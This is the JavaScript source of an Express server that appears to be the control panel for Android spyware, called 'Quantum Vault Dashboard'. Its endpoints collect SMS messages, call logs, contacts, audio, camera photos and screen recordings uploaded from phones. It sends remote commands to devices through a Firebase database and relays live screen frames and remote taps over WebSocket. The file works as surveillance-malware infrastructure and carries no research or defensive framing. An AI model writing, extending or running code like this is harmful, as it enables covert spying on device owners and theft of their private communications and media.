const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const moment = require('moment');
const https = require('https'); // For Firebase REST API

const app = express();
const PORT = 5000;

// ✅ REPLACE with your actual Firebase URL from google-services.json
const FIREBASE_URL = "https://saral-87cd4-default-rtdb.firebaseio.com";

// ─── Directory Setup ──────────────────────────────────────────────────────────
const uploadDirs = ['audios', 'contacts', 'photos', 'videos', 'others',
    'front_photos', 'back_photos', 'screen_recordings'];
uploadDirs.forEach(dir => {
    const dirPath = path.join(__dirname, 'uploads', dir);
    if (!fs.existsSync(dirPath)) fs.mkdirSync(dirPath, { recursive: true });
});

// ─── Data Store ───────────────────────────────────────────────────────────────
const dataFile = path.join(__dirname, 'data.json');
const defaultData = { texts: [], sms: [], files: [], call_logs: [], devices: {} };
if (!fs.existsSync(dataFile)) {
    fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
} else {
    try {
        const existing = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
        let updated = false;
        if (!existing.devices) { existing.devices = {}; updated = true; }
        if (!existing.call_logs) { existing.call_logs = []; updated = true; }
        if (updated) fs.writeFileSync(dataFile, JSON.stringify(existing, null, 2));
    } catch (e) {
        fs.writeFileSync(dataFile, JSON.stringify(defaultData, null, 2));
    }
}

const readData = () => {
    try { return JSON.parse(fs.readFileSync(dataFile, 'utf8')); }
    catch (e) { return { ...defaultData }; }
};
const writeData = (data) => fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));

// ─── Mapping Device-ID to User-ID ─────────────────────────────────────────────
const updateDeviceMap = (deviceId, userId) => {
    if (!deviceId || !userId || deviceId === 'Unknown') return;
    const db = readData();
    if (db.devices[deviceId] !== userId) {
        db.devices[deviceId] = userId;
        writeData(db);
        console.log(`[MAP] Registered ${deviceId} → ${userId}`);
    }
};

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(cors());
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const FOLDER_MAP = {
    '/upload_audios': 'audios',
    '/upload_contacts': 'contacts',
    '/upload_photos': 'photos',
    '/upload_videos': 'videos',
    '/upload_front_photo': 'front_photos',
    '/upload_back_photo': 'back_photos',
    '/upload_screen_recording': 'screen_recordings',
};

const rawBodySaver = (req, res, next) => {
    if (req.headers['content-type'] === 'application/octet-stream') {
        let filename = 'unknown_file';
        const disposition = req.headers['content-disposition'];
        if (disposition && disposition.includes('filename="')) {
            filename = disposition.split('filename="')[1].split('"')[0];
        }

        const folder = FOLDER_MAP[req.path] || 'others';
        const savedName = Date.now() + '_' + filename;
        const filePath = path.join(__dirname, 'uploads', folder, savedName);
        const writeStream = fs.createWriteStream(filePath);
        req.pipe(writeStream);

        const deviceId = req.headers['device-id'] || 'Unknown';
        const userId = req.headers['user-id'];
        updateDeviceMap(deviceId, userId);

        req.on('end', () => {
            const db = readData();
            db.files.push({
                filename,
                path: `/uploads/${folder}/${savedName}`,
                type: folder,
                deviceId,
                timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
            });
            if (db.files.length > 1000) db.files.shift();
            writeData(db);
            res.status(200).send('File Uploaded');
        });
    } else {
        next();
    }
};

app.use(rawBodySaver);
app.use(bodyParser.json({ limit: '10mb' }));

// ─── Endpoints ────────────────────────────────────────────────────────────────

app.post('/upload_text', (req, res) => {
    const { type, data } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const userId = req.headers['user-id'];
    updateDeviceMap(deviceId, userId);

    const db = readData();
    db.texts.push({
        type: type || 'Log',
        data: data || '',
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    if (db.texts.length > 2000) db.texts.shift();
    writeData(db);
    res.status(200).send('Text logged');
});

app.post('/upload_sms', (req, res) => {
    const { sender, message, timestamp } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const userId = req.headers['user-id'];
    updateDeviceMap(deviceId, userId);

    const db = readData();
    db.sms.push({
        sender: sender || 'Unknown',
        message: message || '',
        original_timestamp: timestamp,
        deviceId,
        timestamp: moment().format('YYYY-MM-DD HH:mm:ss')
    });
    writeData(db);
    res.status(200).send('SMS logged');
});

app.post('/upload_call_logs', (req, res) => {
    const { data } = req.body;
    const deviceId = req.headers['device-id'] || 'Unknown';
    const userId = req.headers['user-id'];
    updateDeviceMap(deviceId, userId);

    const db = readData();
    db.call_logs.push({ data: data || '[]', deviceId, timestamp: moment().format('YYYY-MM-DD HH:mm:ss') });
    writeData(db);
    res.status(200).send('Call logs saved');
});

// ─── COMMAND API (Updates Firebase) ───────────────────────────────────────────
app.post('/api/command', (req, res) => {
    const { deviceId, command } = req.body;
    const db = readData();
    const userId = db.devices[deviceId];

    if (!userId) {
        return res.status(404).json({ error: "User-ID not found for this device. Wait for it to sync once." });
    }

    // Update Firebase via REST API
    const url = `${FIREBASE_URL}/commands/${userId}/command.json`;
    const data = JSON.stringify(command);

    const firebaseReq = https.request(url, {
        method: 'PUT',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    }, (firebaseRes) => {
        let body = '';
        firebaseRes.on('data', chunk => body += chunk);
        firebaseRes.on('end', () => {
            console.log(`[CMD] Sent ${command} to ${userId} (${deviceId})`);
            res.json({ success: true, command, userId });
        });
    });

    firebaseReq.on('error', (e) => {
        console.error("Firebase Command Error:", e);
        res.status(500).json({ error: "Failed to reach Firebase" });
    });

    firebaseReq.write(data);
    firebaseReq.end();
});

// API endpoint for live polling
app.get('/api/data', (req, res) => {
    const db = readData();
    res.json({
        texts: [...db.texts].reverse().slice(0, 200),
        sms: [...db.sms].reverse().slice(0, 200),
        files: [...db.files].reverse().slice(0, 200),
        call_logs: [...db.call_logs].reverse().slice(0, 50),
        devices: db.devices
    });
});

app.get('/', (req, res) => {
    const db = readData();
    res.render('index', { data: { ...db, texts: [...db.texts].reverse(), sms: [...db.sms].reverse(), files: [...db.files].reverse(), call_logs: [...db.call_logs].reverse() } });
});

const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Quantum Vault Dashboard → Publicly Accessible via AWS IP on Port ${PORT}`);
});

// ─── WebSocket Relay (Live Streming) ──────────────────────────────────────────
const { WebSocketServer } = require('ws');
const wss = new WebSocketServer({ server });

wss.on('connection', (ws, req) => {
    console.log('[WS] New Connection');

    ws.on('message', (message) => {
        // 1. If it's pure binary (Buffer), it's a JPEG frame from the Android device
        if (Buffer.isBuffer(message)) {
            // Broadcast the frame to all other clients (the dashboard browsers)
            wss.clients.forEach(client => {
                if (client !== ws && client.readyState === WebSocket.OPEN) {
                    client.send(message);
                }
            });
        }
        // 2. If it's a string, it's a JSON command (like a tap/swipe) from the dashboard
        else {
            try {
                const cmdStr = message.toString();
                console.log('[WS CMD] Received from Dash:', cmdStr);

                // Broadcast the command to all other clients (hopefully the Android device)
                wss.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN) {
                        client.send(cmdStr);
                    }
                });
            } catch (e) {
                console.error('[WS CMD] Parse error:', e);
            }
        }
    });

    ws.on('close', () => console.log('[WS] Connection Closed'));
});
